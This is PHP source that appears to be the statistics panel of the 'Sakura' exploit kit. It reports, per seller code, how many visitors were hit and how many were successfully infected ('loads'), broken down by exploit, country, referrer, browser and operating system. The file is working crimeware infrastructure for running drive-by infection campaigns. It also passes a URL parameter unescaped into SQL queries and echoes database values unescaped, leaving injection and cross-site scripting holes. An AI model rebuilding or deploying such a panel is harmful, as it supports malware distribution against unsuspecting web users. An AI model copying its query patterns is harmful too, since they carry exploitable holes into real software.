<?php
error_reporting(0);
include "config.php";



$sell_code = $_GET['t'];
$q = mysql_query("select name from threads WHERE link='".$sell_code."'");
$seller = mysql_fetch_array($q);
@mysql_free_result($q);
if ($seller == "")  {die;exit;} 


?>
<html>
<body>
<head>
<title>- SAKURA -</title>
</head>
<link rel="stylesheet" type="text/css" href="style.css" />
<div id="HeaderLogo">
<img alt="Sakura"  src="logo.jpg"/>
</div>
<br>
<center><a href="showthread.php?t=<?php echo"$sell_code";?>"><b>STAT</b></a>&nbsp; <b><a>|</b></a> &nbsp;
<a href="showthread.php?t=<?php echo"$sell_code";?>&cmd=c"><b>COUNTRY</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="showthread.php?t=<?php echo"$sell_code";?>&cmd=ref"><b>REFERER</b></a>&nbsp;

	  
		  
<?php




if(isset($_GET['cmd']))
{
 $cmd = $_GET['cmd'];

 if($cmd == 'c')
 {
   $query = "SELECT country, count( * ) AS total, sum(`load` = '1') as loads from stat WHERE thread='".$sell_code."' GROUP BY country ORDER BY loads DESC";
   $show = @mysql_query($query);
   
	echo"<br><br><table border=1  cellspacing=0 ñellpadding=0 width='30%' id='ourtable' align='center'> ";
	echo"<tr class='top'>
			<td>Country</td>
			<td>Traffic</td>
			<td>Loads</td>
			<td>Percent</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
		echo"<tr>
    			<td>".$showurl['country']."</td>
				<td>".$showurl['total']."</td>
    			<td>".$showurl['loads']."</td>
				<td>".round($showurl['loads']/$showurl['total']*100, 2)." %</td>
       		</tr>";
    }

    echo"</table>";
	
   exit();
 }
 
 if($cmd == 'ref')
 {
	$query = "SELECT referer, sum(`load` = '1') as loads, count(referer) as traf from stat WHERE thread='".$sell_code."' GROUP BY referer ORDER BY loads DESC";
	$show = @mysql_query($query);
	if($show)
	{
		echo"<br><br><table border=1  cellspacing=0 ñellpadding=0 width='30%' id='ourtable' align='center'>";
		echo"<tr class='top'>
				<td>Source</td>
				<td>Hosts</td>
				<td>Loads</td>
			</tr>";
		while($showurl = mysql_fetch_assoc($show))
		{
			echo"<tr>
					<td>".$showurl['referer']."</td>
					<td>".$showurl['traf']."</td>
					<td>".$showurl['loads']."</td>
				</tr>";
		}
		echo"</table>";
	}
	exit();
}	
exit();
}

$query = "SELECT exploit, sum(`load` = '1') as loads, MAX(id) as ma from stat WHERE `load`='1' AND thread='".$sell_code."' GROUP BY exploit";
$show = @mysql_query($query);
$q = "SELECT count(*) AS al, sum(`load` = '1') as loads from stat WHERE  thread='".$sell_code."'";
$s = @mysql_query($q);
$res = mysql_fetch_assoc($s);
echo"<br><br><table border=1  cellspacing=0 ñellpadding=0 id='ourtable' align='center' >";
	echo"<tr class='top'>
			<td>Hosts</td>
			<td>Run</td>
			<td>Rate</td>
		</tr>";
		$r = round($res ["loads"] / $res ["al"] * 100 ,1);
		echo"<tr>
    			<td>".$res['al']."</td>
    			<td>".$res['loads']."</td>
				<td>". $r."%</td>
       		</tr>";
	
	echo"</table>";
if($show)
{
	
	echo"<table border=1  cellspacing=0 ñellpadding=0  id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Exploit</td>
			<td>Loads</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
		echo"<tr>
    			<td>".$showurl['exploit']."</td>
    			<td>".$showurl['loads']."</td>
       		</tr>";
    }

	echo"</table>";

}
$query = "SELECT browser, sum(`load` = '1') as loads, count(browser) as traf from stat WHERE  thread='".$sell_code."' GROUP BY browser";
$show = @mysql_query($query);
if($show)
{
	echo"<table border=1  cellspacing=0 ñellpadding=0  id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Browser</td>
			<td>Hosts</td>
			<td>Loads</td>
			<td>Result</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
    	if($showurl['loads'] == 0) $pr = 0;
		else $pr = round($showurl['loads'] / $showurl['traf'] * 100 ,1);
		echo"<tr>
    			<td>".$showurl['browser']."</td>
    			<td>".$showurl['traf']."</td>
				<td>".$showurl['loads']."</td>
				<td>".$pr."%</td>
       		</tr>";
    }
    echo"</table>";
}
$query = "SELECT os, sum(`load` = '1') as loads, count(os) as traf from stat WHERE  thread='".$sell_code."' GROUP BY os ORDER BY loads DESC";
$show = @mysql_query($query);
if($show)
{
	echo"<table border=1  cellspacing=0 ñellpadding=0 id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Operation System</td>
			<td>Hosts</td>
			<td>Loads</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
    	
		echo"<tr>
    			<td>".$showurl['os']."</td>
    			<td>".$showurl['traf']."</td>
				<td>".$showurl['loads']."</td>
       		</tr>";
    }
    echo"</table>";
}
?>
<body></html>